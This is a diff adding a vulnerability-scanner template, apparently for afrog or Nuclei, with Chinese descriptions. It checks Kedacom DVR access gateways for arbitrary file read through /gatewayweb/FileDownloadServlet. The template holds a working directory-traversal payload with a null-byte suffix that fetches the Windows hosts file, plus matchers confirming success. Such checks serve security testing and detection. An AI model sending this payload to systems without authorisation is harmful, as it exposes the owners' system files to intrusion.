@@ -1,0 +1,30 @@
+id: kedacom-gateway-file-read
+
+info:
+  name: 科达 DVR 接入网关 FileDownloadServlet 任意文件读取
+  author: zan8in
+  severity: high
+  description: |
+    科达数字系统/DVR 接入网关 /gatewayweb/FileDownloadServlet 可通过 filePath 目录遍历读取系统文件。
+    与 Phoenix 监控平台、MTS 转码服务器、网络键盘控制台不是同一 SKU。
+  reference:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book
+    - https://github.com/zan8in/afrog
+  tags: kedacom,gateway,lfi
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/gatewayweb/FileDownloadServlet?fileName=test.txt&filePath=../../../../../../../../../../Windows/System32/drivers/etc/hosts%00.jpg&type=2"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Microsoft TCP/IP for Windows"
+          - "HOSTS file"
+        condition: and
